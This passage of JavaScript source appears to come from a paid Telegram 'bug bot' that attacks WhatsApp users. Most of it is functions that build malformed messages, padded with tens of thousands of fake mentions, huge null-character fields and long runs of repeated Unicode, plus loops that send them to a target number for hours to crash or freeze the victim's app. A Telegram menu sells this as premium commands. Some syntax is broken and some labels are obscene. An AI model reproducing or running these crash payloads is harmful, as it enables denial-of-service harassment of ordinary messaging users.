            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(targetNumber, message, {});

  await Ryuu.relayMessage("status@broadcast", msg.message, {
    messageId: generateRandomMessageId(),
    statusJidList: [targetNumber],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetNumber },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          }
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Ryuu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function protocolbug5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
    title: "Finix",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "REVERSED BY COSMO",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await Ryuu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Ryuu.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "(#) SCHEMA HADES",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: ".𝐌𝐚𝐤𝐥𝐨 ▾" + "༑ ▾俳貍賳貎".repeat(100),
                                    title: "Finix",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await Ryuu.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Ryuu.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}

async function protocolbug6(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "Botak Kontol #Ryuichi",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "H𐌀D𐌄S xPloit", 
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "COSMOXMEMEK",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Ryuu.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ryuu.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "H𐌀D𐌄S xPloit" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

async function BulldozerComboX(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 800) {
        await Promise.all([
            bulldozer(target, false),
            protocolbug6(target, false),
        ]);
        console.log(chalk.blue(`HADES DRAIN ${count}/800 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();

}

async function HardLevelDelay(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
       }

        try {
    if (count < 400) {
        await Promise.all([
            protocolbug6(target, false),
            protocolbug5(target, false),
            protocolbug3(target, false),
        ]);
        console.log(chalk.blue(`HADES DELAY ${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
    } else {
        console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 400 Messages"));
        setTimeout(sendNext, 100);
    }
} catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 100);
}
};

sendNext();

}

//CRASH
async function CosmoUisystem(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "[̲̅𝖍𝕬𝖉𝖊𝖘𝕰𝖘𝖘𝖊𝖓𝖈𝖊𝖃",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "Reversed by Cosmo"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*Etichaly*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "Etichaly"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await Ryuu.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
        }

async function VampDelayMess(target, Ptcp = true) {
      await Ryuu.relayMessage(target, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "VISCOUNT",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐑͢𝐲͡𝐮𝐮𝐒͜𝐭𝐫͢𝐢͡𝐤𝐞\n" + "@15056662003".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'Iqbhalkeifer', url: \"https://t.me/@raysofhopee\", merchant_url: \"https://t.me/travascosmo\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "COsmo 𝐯𝐬 𝐄𝐯𝐞𝐫𝐲𝐛𝐨𝐝𝐲",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
    }

async function blank1(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "𝐑͢𝐲͡𝐮𝐮𝐒͜𝐭𝐫͢𝐢͡𝐤𝐞" + "ោ៝".repeat(10000),
      caption: "𝐑͢𝐲͡𝐮𝐮𝐒͜𝐭𝐫͢𝐢͡𝐤𝐞" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await Ryuu.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function blank2(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝐑͢𝐲͡𝐮𝐮𝐒͜𝐭𝐫͢𝐢͡𝐤𝐞" + "ោ៝".repeat(100000),
      caption: "𝐑͢𝐲͡𝐮𝐮𝐒͜𝐭𝐫͢𝐢͡𝐤𝐞" + "ោ៝".repeat(100000),
      jpegThumbnail: null
    }
  };
  await Ryuu.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}




// ------------------ ( END FUNCTION ) ------------------------ \\

// ------------------ ( COMBO DURATION BY VEROW ) ------------------------ \\

async function DelayV1(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 100) {
        protocolbug6(target, false)
        await new Promise((resolve) => setTimeout(resolve, 500));
        
        console.log(
          chalk.red(`Ryuuu) (☠️) ${count}/100 to ${target}`)
        );
        count++;
        setTimeout(sendNext, 500);
      } else {
        console.log(chalk.green(`✅ Success Sending 100 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 100 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function DelayBrutal(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {a
      if (count < 200) {
        await Promise.all([
        delayinvisi(target), 
        Delaymonth(target), 
        Xvold(target), 
        multiscorpio(target), 
        Xvold(target), 
        Xvold(target),
        ]);
        console.log(chalk.bold.red(`Send bug By Ryuu ${count}/200 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function RyuuX(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 600) {
        await Promise.all([
        delayinvisi(target), 
        Delaymonth(target), 
        Xvold(target), 
        multiscorpio(target), 
        Xvold(target), 
        ]);
        console.log(chalk.red.bold(`Send bug Invisible ${count}/600 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function maklu(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
        Delaymonth(target), 
        Xvold(target), 
        multiscorpio(target), 
        Xvold(target), 
        Xvold(target), 
        multiscorpio(target), 
        Xvold(target), 
        ]);
        console.log(chalk.blue.bold(`Send bug Invisible strike ${count}/400 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}


async function RyuTrick(durationHours, target) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log(`Stopped after sending ${count} messages`);
      return;
    }

    try {
      if (count < 300) {
        await Promise.all([
        Xvold(target), 
        Xvold(target), 
        Xvold(target), 
        Xvold(target), 
        multiscorpio(target), 
        multiscorpio(target), 
        Delaymonth(target), 
        ]);
        console.log(chalk.blue(`Proses Send Bug ${count}/300 ke ${target}`));
        count++;
        setTimeout(sendNext, 100);
      } else {
        console.log(
          chalk.green(`✅ Success Sending 800 Messages`)
        );
        count = 0;
        console.log(chalk.red("➡️ Next 800 Messages"));
        setTimeout(sendNext, 100);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

async function RyuuCombo(target) {
      for (let i = 0; i < 50; i++) {
        await LalaDoct(target); 
        await VampDelayCrash(target);
        await HadesKillUi(target, Ptcp = true);
        await VampPrivateBlank(target)
        await CosmoBlank(target, ptcp = true);
        await FloodsCarousel(target, Ptcp = true);
        await Carouselforcex(target);
   }    
   
};  
 
async function RyuuUi(target) {
      for (let i = 0; i < 70; i++) {
        await LalaDoct(target); 
        await VampDelayCrash(target);
        await HadesKillUi(target, Ptcp = true);
        await VampPrivateBlank(target);
        await CosmoUisystem(target, ptcp = true);
   }    
   
};   

async function Xui(target) {
      for (let i = 0; i < 60; i++) {
        await blank2(target);
        await blank1(target);
        await VampDelayCrash(target);
        await HadesKillUi(target, Ptcp = true);
        await VampPrivateBlank(target)
        await blank2(target);
        await CosmoUisystem(target, ptcp = true);
        await VampDelayMess(target, Ptcp = true);
   }    
   
};   

// --------------- ( Case Or Bot on text Area ) --------------- \\
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
  const ownerid = config.OWNER_ID;
  const chatType = msg.chat.type;

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://n.uguu.se/sWcnyrbq.jpg", {
      caption: `\`\`\` ⚠️ ИЗВИНИТЕ, ВЫ НЕ ЯВЛЯЕТЕСЬ ПОЛЬЗОВАТЕЛЕМ PREM \`\`\`        
    ! Kamu bukan premium users, silahkann beli akses ke owner dengan cara tekan tombol dibawah...
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contacts Owners", url: "https://t.me/xmryuu" }],
        ],
      },
    });
  }

  if (isGroupOnly() && chatType === "Public") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  bot
    .sendVideo(chatId, "https://h.uguu.se/gFWyErOo.mp4", {
      caption: `\`\`\`
─ Меня зовут ВИКОНТ ИНФИНИТИ. Я готов помочь в любое время и в любом месте. 

♰ 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘛𝘐𝘖𝘕 ♰
☃︎ Author : —͟͞Ryuichi
☃︎ Version : 3.0
☃︎ Bot Mode : ${mode}
☃︎ Language : nodeJS
☃︎ InterFace : Button Type
☃︎ Run Time : ${runtime}

©Ryuichi

———————————–
Select Button Below
———–————————
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐁͢𝐮͡𝐠͜ 𝐌͢𝐞͡𝐧͜𝐮", callback_data: "bugmenu" }],
          [
            { text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫͡ 𝐌͢𝐞͡𝐧͜𝐮", callback_data: "ownermenu" },
            { text: "𝐓͢𝐡͡𝐚͜𝐧͢𝐤͡𝐬͜ 𝐭͢𝐨", callback_data: "thanksto" },
          ],
          [{ text: "𝐎͢𝐰͡𝐧͜𝐞͢𝐫͡", url: "https://t.me/curseryu" }], 
          ]
           }
           });
           });
bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const mode = groupOnlyData.groupOnly ? "Grup Only" : "Public";
  const ownerid = config.OWNER_ID;

  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `\`\`\`
─ Меня зовут ВИКОНТ ИНФИНИТИ. Я готов помочь в любое время и в любом месте. 

☃︎ /xcore >> core invisible
☃︎ /hardinvis >> hard delay invisible
☃︎ /combox >> delay burtality
☃︎ /xcdelay >> delay universe
☃︎ /xbug >> Type button

©Ryuichi

\`\`\``;
    newButtons = [[{ text: "🔙", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = `\`\`\`
─ Меня зовут ВИКОНТ ИНФИНИТИ. Я готов помочь в любое время и в любом месте. 

☃︎ /addprem <id> <day>
☃︎ /delprem <id>
☃︎ /listprem
☃︎ /addadmin <id>
☃︎ /deladmin <id>
☃︎ /setjeda 5m
☃︎ /gruponly on|off
☃︎ /addsender <number>

©Ryuichi
\`\`\``;
    newButtons = [[{ text: "🔙", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = `\`\`\`
─ Меня зовут ВИКОНТ ИНФИНИТИ. Я готов помочь в любое время и в любом месте. 
# -  𝚃𝙷𝙰𝙽𝙺𝚂 𝚃𝙾

☃︎ Wolff [ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 ]
☃︎ Daffaap   [ 𝙵𝚁𝙸𝙴𝙽𝙳 ]
☃︎ Marcz [ 𝙵𝚁𝙸𝙴𝙽𝙳 ]
☃︎ Mortal [ 𝙵𝚁𝙸𝙴𝙽𝙳 ]
☃︎ zare [ 𝙵𝚁𝙸𝙴𝙽𝙳 ]
☃︎ Primrose Lotus  [ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 ]

©Ryuichi
\`\`\``;
    newButtons = [[{ text: "🔙", callback_data: "mainmenu" }]];
